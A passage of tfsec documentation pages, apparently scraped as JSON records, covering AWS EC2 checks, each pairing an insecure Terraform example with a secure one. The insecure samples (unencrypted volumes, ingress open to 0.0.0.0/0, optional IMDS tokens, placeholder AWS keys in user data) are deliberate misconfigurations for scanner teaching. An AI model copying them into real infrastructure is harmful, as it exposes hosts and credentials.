"2025-10-24T22:23:59.871415"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/enable-at-rest-encryption/index.md", "content": "---\ntitle: Instance with unencrypted block device.\n---\n\n# Instance with unencrypted block device.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBlock devices should be encrypted to ensure sensitive data is held securely at rest.\n\n### Possible Impact\nThe block device could be compromised and read from\n\n### Suggested Resolution\nTurn on encryption for all block devices\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-enable-at-rest-encryption check.\n```terraform\n\nresource \"aws_instance\" \"bad_example\" {\n  ami = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n      encrypted = false\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    volume_size = 5\n    volume_type = \"gp2\"\n    delete_on_termination = false\n    encrypted = false\n  }\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-enable-at-rest-encryption check.\n```terraform\n\nresource \"aws_instance\" \"good_example\" {\n  ami = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n      encrypted = true\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    volume_size = 5\n    volume_type = \"gp2\"\n    delete_on_termination = false\n    encrypted = true\n  }\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:00.195397"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/enable-launch-config-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/enable-launch-config-at-rest-encryption/index.md", "content": "---\ntitle: Launch configuration with unencrypted block device.\n---\n\n# Launch configuration with unencrypted block device.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBlock devices should be encrypted to ensure sensitive data is held securely at rest.\n\n### Possible Impact\nThe block device could be compromised and read from\n\n### Suggested Resolution\nTurn on encryption for all block devices\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-enable-launch-config-at-rest-encryption check.\n```terraform\n\n resource \"aws_launch_configuration\" \"bad_example\" {\n \troot_block_device {\n \t\tencrypted = false\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-enable-launch-config-at-rest-encryption check.\n```terraform\n\n resource \"aws_launch_configuration\" \"good_example\" {\n \troot_block_device {\n \t\tencrypted = true\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:00.495238"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/enable-volume-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/enable-volume-encryption/index.md", "content": "---\ntitle: EBS volumes must be encrypted\n---\n\n# EBS volumes must be encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBy enabling encryption on EBS volumes you protect the volume, the disk I/O and any derived snapshots from compromise if intercepted.\n\n### Possible Impact\nUnencrypted sensitive data is vulnerable to compromise.\n\n### Suggested Resolution\nEnable encryption of EBS volumes\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-enable-volume-encryption check.\n```terraform\n\n resource \"aws_ebs_volume\" \"bad_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-enable-volume-encryption check.\n```terraform\n\n resource \"aws_ebs_volume\" \"good_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:00.807711"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/enforce-http-token-imds/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/enforce-http-token-imds/index.md", "content": "---\ntitle: aws_instance should activate session tokens for Instance Metadata Service.\n---\n\n# aws_instance should activate session tokens for Instance Metadata Service.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nIMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS.\nBy default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional. \nTo fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.\n\n\n### Possible Impact\nInstance metadata service can be interacted with freely\n\n### Suggested Resolution\nEnable HTTP token requirement for IMDS\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-enforce-http-token-imds check.\n```terraform\n\n resource \"aws_instance\" \"bad_example\" {\n\t ami           = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-enforce-http-token-imds check.\n```terraform\n\n resource \"aws_instance\" \"good_example\" {\n\t ami           = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n\t metadata_options {\n\t http_tokens = \"required\"\n\t }\t\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:01.078715"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/enforce-launch-config-http-token-imds/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/enforce-launch-config-http-token-imds/index.md", "content": "---\ntitle: aws_instance should activate session tokens for Instance Metadata Service.\n---\n\n# aws_instance should activate session tokens for Instance Metadata Service.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\n\nIMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS.\nBy default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional. \nTo fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.\n\n\n### Possible Impact\nInstance metadata service can be interacted with freely\n\n### Suggested Resolution\nEnable HTTP token requirement for IMDS\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-enforce-launch-config-http-token-imds check.\n```terraform\n\n resource \"aws_launch_template\" \"bad_example\" {\n\t image_id      = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-enforce-launch-config-http-token-imds check.\n```terraform\n\n resource \"aws_launch_template\" \"good_example\" {\n\t image_id      = \"ami-005e54dee72cc1d00\"\n\t instance_type = \"t2.micro\"\n\t metadata_options {\n\t   http_tokens = \"required\"\n\t }\t\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:01.372927"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/index.md", "content": "---\ntitle: ec2\n---\n\n# ec2\n\n## Checks\n\n\n- [add-description-to-security-group](add-description-to-security-group) Missing description for security group.\n\n- [add-description-to-security-group-rule](add-description-to-security-group-rule) Missing description for security group rule.\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Instance with unencrypted block device.\n\n- [enable-launch-config-at-rest-encryption](enable-launch-config-at-rest-encryption) Launch configuration with unencrypted block device.\n\n- [enable-volume-encryption](enable-volume-encryption) EBS volumes must be encrypted\n\n- [enforce-http-token-imds](enforce-http-token-imds) aws_instance should activate session tokens for Instance Metadata Service.\n\n- [enforce-launch-config-http-token-imds](enforce-launch-config-http-token-imds) aws_instance should activate session tokens for Instance Metadata Service.\n\n- [no-default-vpc](no-default-vpc) AWS best practice to not use the default VPC for workflows\n\n- [no-excessive-port-access](no-excessive-port-access) An ingress Network ACL rule allows ALL ports.\n\n- [no-public-egress-sgr](no-public-egress-sgr) An egress security group rule allows traffic to /0.\n\n- [no-public-ingress-acl](no-public-ingress-acl) An ingress Network ACL rule allows specific ports from /0.\n\n- [no-public-ingress-sgr](no-public-ingress-sgr) An ingress security group rule allows traffic from /0.\n\n- [no-public-ip](no-public-ip) Launch configuration should not have a public IP address.\n\n- [no-public-ip-subnet](no-public-ip-subnet) Instances in a subnet should not receive a public IP address by default.\n\n- [no-secrets-in-launch-template-user-data](no-secrets-in-launch-template-user-data) User data for EC2 instances must not contain sensitive AWS keys\n\n- [no-secrets-in-user-data](no-secrets-in-user-data) User data for EC2 instances must not contain sensitive AWS keys\n\n- [no-sensitive-info](no-sensitive-info) Ensure all data stored in the launch configuration EBS is securely encrypted\n\n- [volume-encryption-customer-key](volume-encryption-customer-key) EBS volume encryption should use Customer Managed Keys\n\n\n\n", "timestamp": "2025-10-24T22:24:01.481376"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-default-vpc/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-default-vpc/index.md", "content": "---\ntitle: AWS best practice to not use the default VPC for workflows\n---\n\n# AWS best practice to not use the default VPC for workflows\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nDefault VPC does not have a lot of the critical security features that standard VPC comes with, new resources should not be created in the default VPC and it should not be present in the Terraform.\n\n### Possible Impact\nThe default VPC does not have critical security features applied\n\n### Suggested Resolution\nCreate a non-default vpc for resources to be created in\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-default-vpc check.\n```terraform\n\n resource \"aws_default_vpc\" \"default\" {\n \ttags = {\n \t  Name = \"Default VPC\"\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-default-vpc check.\n```terraform\n\n # no aws default vpc present\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html](https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:01.776644"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-excessive-port-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-excessive-port-access/index.md", "content": "---\ntitle: An ingress Network ACL rule allows ALL ports.\n---\n\n# An ingress Network ACL rule allows ALL ports.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEnsure access to specific required ports is allowed, and nothing else.\n\n### Possible Impact\nAll ports exposed for egressing data\n\n### Suggested Resolution\nSet specific allowed ports\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-excessive-port-access check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"all\"\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-excessive-port-access check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:02.161693"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-public-egress-sgr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-public-egress-sgr/index.md", "content": "---\ntitle: An egress security group rule allows traffic to /0.\n---\n\n# An egress security group rule allows traffic to /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.\n\n### Possible Impact\nYour port is egressing data to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-public-egress-sgr check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n \tegress {\n \t\tcidr_blocks = [\"0.0.0.0/0\"]\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-public-egress-sgr check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n \tegress {\n \t\tcidr_blocks = [\"1.2.3.4/32\"]\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html](https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:02.502948"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-public-ingress-acl/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-public-ingress-acl/index.md", "content": "---\ntitle: An ingress Network ACL rule allows specific ports from /0.\n---\n\n# An ingress Network ACL rule allows specific ports from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ACLs to the public internet is potentially dangerous. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nThe ports are exposed for ingressing data to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-public-ingress-acl check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-public-ingress-acl check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"10.0.0.0/16\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:02.780916"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-public-ingress-sgr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-public-ingress-sgr/index.md", "content": "---\ntitle: An ingress security group rule allows traffic from /0.\n---\n\n# An ingress security group rule allows traffic from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nYour port exposed to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-public-ingress-sgr check.\n```terraform\n\n resource \"aws_security_group_rule\" \"bad_example\" {\n \ttype = \"ingress\"\n \tcidr_blocks = [\"0.0.0.0/0\"]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-public-ingress-sgr check.\n```terraform\n\n resource \"aws_security_group_rule\" \"good_example\" {\n \ttype = \"ingress\"\n \tcidr_blocks = [\"10.0.0.0/16\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:03.066765"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-public-ip-subnet/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-public-ip-subnet/index.md", "content": "---\ntitle: Instances in a subnet should not receive a public IP address by default.\n---\n\n# Instances in a subnet should not receive a public IP address by default.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.\n\n### Possible Impact\nThe instance is publicly accessible\n\n### Suggested Resolution\nSet the instance to not be publicly accessible\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-public-ip-subnet check.\n```terraform\n\n resource \"aws_subnet\" \"bad_example\" {\n\tvpc_id                  = \"vpc-123456\"\n\tmap_public_ip_on_launch = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-public-ip-subnet check.\n```terraform\n\n resource \"aws_subnet\" \"good_example\" {\n\tvpc_id                  = \"vpc-123456\"\n\tmap_public_ip_on_launch = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:03.330282"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-public-ip/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-public-ip/index.md", "content": "---\ntitle: Launch configuration should not have a public IP address.\n---\n\n# Launch configuration should not have a public IP address.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.\n\n### Possible Impact\nThe instance or configuration is publicly accessible\n\n### Suggested Resolution\nSet the instance to not be publicly accessible\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-public-ip check.\n```terraform\n\n resource \"aws_launch_configuration\" \"bad_example\" {\n \tassociate_public_ip_address = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-public-ip check.\n```terraform\n\n resource \"aws_launch_configuration\" \"good_example\" {\n \tassociate_public_ip_address = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:03.590973"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-secrets-in-launch-template-user-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-secrets-in-launch-template-user-data/index.md", "content": "---\ntitle: User data for EC2 instances must not contain sensitive AWS keys\n---\n\n# User data for EC2 instances must not contain sensitive AWS keys\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.\n\n### Possible Impact\nUser data is visible through the AWS Management console\n\n### Suggested Resolution\nRemove sensitive data from the EC2 instance user-data generated by launch templates\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-secrets-in-launch-template-user-data check.\n```terraform\n\n resource \"aws_launch_template\" \"bad_example\" {\n \n\t image_id      = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t user_data = <<EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \nEOF\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-secrets-in-launch-template-user-data check.\n```terraform\n\n resource \"aws_iam_instance_profile\" \"good_example\" {\n\t\t // ...\n }\n \n resource \"aws_launch_template\" \"good_example\" {\n\t image_id      = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t iam_instance_profile {\n\t\t name = aws_iam_instance_profile.good_profile.arn\n\t }\n\t user_data = <<EOF\n\t export GREETING=hello\nEOF\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:03.891800"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-secrets-in-user-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-secrets-in-user-data/index.md", "content": "---\ntitle: User data for EC2 instances must not contain sensitive AWS keys\n---\n\n# User data for EC2 instances must not contain sensitive AWS keys\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.\n\n### Possible Impact\nUser data is visible through the AWS Management console\n\n### Suggested Resolution\nRemove sensitive data from the EC2 instance user-data\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-secrets-in-user-data check.\n```terraform\n\n resource \"aws_instance\" \"bad_example\" {\n \n\t ami           = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t user_data = <<EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \n EOF\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-secrets-in-user-data check.\n```terraform\n\n resource \"aws_iam_instance_profile\" \"good_example\" {\n\t\t // ...\n }\n \n resource \"aws_instance\" \"good_example\" {\n\t ami           = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t iam_instance_profile = aws_iam_instance_profile.good_profile.arn\n \n\t user_data = <<EOF\n\t export GREETING=hello\n EOF\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:04.184923"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/no-sensitive-info/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/no-sensitive-info/index.md", "content": "---\ntitle: Ensure all data stored in the launch configuration EBS is securely encrypted\n---\n\n# Ensure all data stored in the launch configuration EBS is securely encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWhen creating Launch Configurations, user data can be used for the initial configuration of the instance. User data must not contain any sensitive data.\n\n### Possible Impact\nSensitive credentials in user data can be leaked\n\n### Suggested Resolution\nDon't use sensitive data in user data\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-no-sensitive-info check.\n```terraform\n\n resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = <<EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-no-sensitive-info check.\n```terraform\n\n resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = <<EOF\n export GREETING=\"Hello there\"\n EOF\n }\n \n```\n\n\n\n### Links\n\n\n- 